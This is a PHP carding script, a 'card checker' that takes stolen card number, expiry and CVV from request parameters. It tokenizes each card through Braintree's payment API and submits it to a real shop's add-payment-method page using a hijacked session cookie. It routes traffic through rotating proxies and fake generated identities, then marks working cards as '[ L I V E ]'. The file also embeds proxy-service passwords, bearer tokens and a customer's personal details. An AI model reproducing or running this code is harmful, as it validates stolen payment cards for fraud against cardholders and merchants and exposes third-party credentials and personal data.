<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$binn = substr($cc,0,6);


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);


if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}

// If(strlen($ano) > 2)
// {
//   $ano = substr($ano,2,2);
// }
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
  return $email;
}

///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
$email = email($nombre);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
$username = 'lum-customer-hl_6366aa06-zone-static_res';
$password = 'a9by3kql965v';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);

function ibuuproxy(){
  $poxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($poxySocks)-1);
   $poxySocks = $poxySocks[$myproxy];
 return $poxySocks;
}

$poxySocks5 = ibuuproxy();

// $fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
// $lname = 'Wang';
// $email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
// $email2 = $fname.rand(10,999).'@yopmail.com';
// //$password = 'P@5%Word';
// $password2 = 'Hansabhen1@';
$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);

$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);




//============================================================================================================================================================
 // Request 1


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
# Uncomment the upper two lines if you have filled the upper login details
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTAzMjExMjEsImp0aSI6IjdlYTY3ZDljLTg2ODItNDg5My04YjZkLTUxNzVmNjZmMWFiZCIsInN1YiI6InFtNHRxZDk0MnY3aG5oZGoiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InFtNHRxZDk0MnY3aG5oZGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiZmxvd2JveFVTRCJ9fQ.9_L2nyHz7aM1XBNtF67oKJfF-JDFqCFnaNRdYYYHZvrJdwXfJKrjQ3E2eOIliCpgDXNVqJdeIay_3zVDeh1L1A',
'braintree-version: 2018-05-10',
'content-type: application/json',
'origin: https://assets.braintreegateway.com',
'referer: https://payments.braintree-api.com/',
'user-agent: '.$browser.''
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"7bc265b1-0e7e-4f65-ac41-17b65945f4e0"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"2150","streetAddress":"661 STATE ST"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$b_pago = curl_exec($ch);

curl_close($ch);

   // echo $b_pago;
$token = trim(strip_tags(getstr($b_pago,'"token":"','"')));
// $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
$issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
$issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
$type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
$category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));





$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://shop.flowbox.io/my-account/add-payment-method/');

//////////////////////// PROXY CALLS ////////////////////////////
//               REMOVE '//' FOR PROXIES TO WORK BELOW

//////////////////////// PROXYSCRAPE
// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
//////////////////////// WEBSHARE
// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");

//////////////////////// MANUAL Proxy List
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST

//////////////////////// LUMINATI
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// End Proxy Calls
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: en-US,en;q=0.9',
'Content-Type: application/x-www-form-urlencoded',
'cookie: wp_lead_uid=aFf1ToFUvHbT7ekZHy5TisZf5Q6vfFEm4K4; inbound_referral_site=Direct Traffic; PHPSESSID=93j8i0950tkm5p4m7ok3bm1urh; tk_ai=woo%3AYiqd435u6S%2BsilM6nccG2OHu; wp_lead_id=51875; lead_data_expire=true; inbound_wpleads_first_name=Vincent; inbound_wpleads_last_name=Warner; inbound_wpleads_country_code=GB; inbound_wpleads_work_phone=05182641524; inbound_wpleads_email_address=pubgkittu%40gmail.com; inbound_wpleads_company_name=Freelancer; wp_lead_list=%7B%22ids%22%3A%5B107%2C106%2C99%5D%7D; woocommerce_items_in_cart=1; woocommerce_cart_hash=ce4cc22b5c6eef9181e5faef0d8263e8; wordpress_logged_in_4bdb882eaf8fe442bf6d602304ef35c9=vincent.warner%7C1591287089%7CLrCZosQGwJnsupQ63KtR6TCUk7bX9l2YDgY2Q29b8Kx%7Cfe74e9f21b206f2f1afa491e9d1cd90ecd67edacf6759ee24da03b01d4ea4337; wp_woocommerce_session_4bdb882eaf8fe442bf6d602304ef35c9=1024%7C%7C1590250226%7C%7C1590246626%7C%7C396390612815571a5aeb2c61911a7ee5; lead_session=270',
'origin: https://shop.flowbox.io',
'referer: https://shop.flowbox.io/my-account/add-payment-method/',
'User-Agent: '.$browser.''
));

//////////////////////// START POST FILED 1 ////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%22c112fe229128ee8bcd79a17e64022e8e%22%2C%22fraud_merchant_id%22%3Anull%7D&wc_braintree_3ds_enabled=&wc_braintree_3ds_active=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fqm4tqd942v7hnhdj%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fqm4tqd942v7hnhdj%22%7D%2C%22merchantId%22%3A%22qm4tqd942v7hnhdj%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIwNWE4ZGQxNS1mOTFmLTRmYjYtODdiMS0yMjIzMDFhNjNkZTIiLCJpYXQiOjE1OTAyMzQ3MjcsImV4cCI6MTU5MDI0MTkyNywiaXNzIjoiNWM4YWExZjJhZGIxNTYyZTAwM2M4YTg0IiwiT3JnVW5pdElkIjoiNWM4YWExZjFhZGIxNTYyZTAwM2M4YTdlIn0.9iwgZJofSauvEqa3N_HWSd6hOX5hj69b2YnbDYCa2oE%22%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Flowbox%22%2C%22clientId%22%3A%22AT9_4c6CdkXdct5R8OR2ZBHykjWBTit1QTo1FvlmCyrDTsr88rZyMJBxG70udZavExf2GcAkQuuzbud-%22%2C%22privacyUrl%22%3A%22https%3A%2F%2Fshop.flowbox.io%2Fprivacy_policy%2F%22%2C%22userAgreementUrl%22%3A%22https%3A%2F%2Fshop.flowbox.io%2Fterms-and-conditions%2F%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22flowboxUSD%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&woocommerce-add-payment-method-nonce=a24acd2f39&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');

// // // //*****************************************************************************************************************************************************************************************************************************************************************************


$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:'.curl_error($ch);
}
curl_close($ch);

$message = trim(strip_tags(getstr($result,'<div class="woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">','</ul>')));
// $code = trim(strip_tags(getstr($result,'"message":"','"')));
 // $message2 = trim(strip_tags(getstr($result,'"decline_code": "','"')));


//////////////////////// BIN INFO ////////////////////////////////

/////////////////// RESULT ////////////////////////////////////
if(strpos($result,'Payment method successfully added')){
  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
   }
elseif(strpos($result,'There has been a critical error on your website')){
     echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ 3 R R 0 R ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
   }
else {
// updatecart();

     echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';



  }
curl_close($curl);
ob_flush();
       // echo $result;
//echo $browser;
?>
